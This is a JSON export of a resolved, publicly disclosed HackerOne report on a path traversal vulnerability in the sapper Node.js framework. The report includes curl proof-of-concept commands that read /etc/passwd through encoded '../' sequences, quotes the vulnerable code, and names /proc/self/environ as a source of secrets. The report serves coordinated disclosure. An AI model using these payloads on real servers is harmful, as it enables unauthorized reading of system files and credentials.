{
  "id": 820224,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjAyMjQ=",
  "url": "https://hackerone.com/reports/820224",
  "title": "[sapper] Path Traversal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-03-16T14:09:41.426Z",
  "submitted_at": "2020-03-16T14:09:41.426Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "anvikha",
    "url": "/anvikha",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-18T20:41:23.088Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-06-18T20:37:24.816Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a critical path traversal vunerability in the sapper module\nIt allows an attacker to simply obain arbitrary files from the remote server, exploiting a simple path traversal using URL-encoded \"../\".\n\n# Module\n\n**module name:** sapper\n**version:** 0.27.10\n**npm page:** `https://www.npmjs.com/package/sapper`\n\n## Module Description\n\nSapper is a framework for building high-performance universal web apps. Read the guide or the introductory blog post to learn more.\n\n## Module Stats\n\n[6,762] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe vulnerability was found by playing with a sapper / webpack stack while researching vulnerabilities on internal projects. \nI started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code.\n\n## Steps To Reproduce:\n\n1. Clone https://github.com/sveltejs/sapper-template project\n2. `npm i`\n3. Use `degit` to obtain the webpack example app: `npx degit \"sveltejs/sapper-template#webpack\" my-app`\n4. `npx sapper dev` - **exploit** with `curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`\nThis also works in prod mode with\n4. `npx sapper build && node __sapper__build` - **exploit** with `curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`\n \nThe reason why the production deployment requires an extra-layer of URL encoding is because this project runs under polka in production, which, contrary to express for example, applies an extra `decodeURIComponent` on the URI.\n\n## Patch\n\nSapper server simply forms a path with `path.resolve` using the `build_dir` as base directory and the URI-decoded `file` passed in the URL, resulting in a path traversal. \nI am not providing a patch here, but here I've identified the vulnerable code:\n\nsapper/runtime/server.mjs\n------------\n\n```\nfunction serve({ prefix, pathname, cache_control }\n\n\n\n) {\n  const filter = pathname\n    ? (req) => req.path === pathname\n    : (req) => req.path.startsWith(prefix);\n\n  const cache = new Map();\n\n  const read = dev\n    ? (file) => fs.readFileSync(path.resolve(build_dir, file))\n    : (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.resolve(build_dir, file)))).get(file);\n\n  return (req, res, next) => {\n    if (filter(req)) {\n    const type = lookup(req.path);\n\n    try {\n      const file = decodeURIComponent(req.path.slice(1));\n      const data = read(file);\n\n      res.setHeader('Content-Type', type);\n      res.setHeader('Cache-Control', cache_control);\n      res.end(data);\n```\n\n## Supporting Material/References:\n\n- OS: Debian Linux sid\n- NodeJS: v10.19.0\n- NPM: 6.13.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N - I think this is too severe and impacts too many sites to make it public. \n\n![geat success](https://media.makeameme.org/created/very-nice-great-j9n9bg.jpg)\n\n## Impact\n\nAny file can be retrieved from the remote server, namely stuff like /proc/self/environ, which would contain any sort of API keys used by the environment the application has been deployed too. This will lead to complete infrastructure RCE and takeover.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-07-18T20:37:24.886Z",
  "allow_singular_disclosure_after": -112726968.86373273,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "brahim_boufakri01",
    "b69fb2ebda43240ece9dbeb",
    "coldview",
    "m0n573r"
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
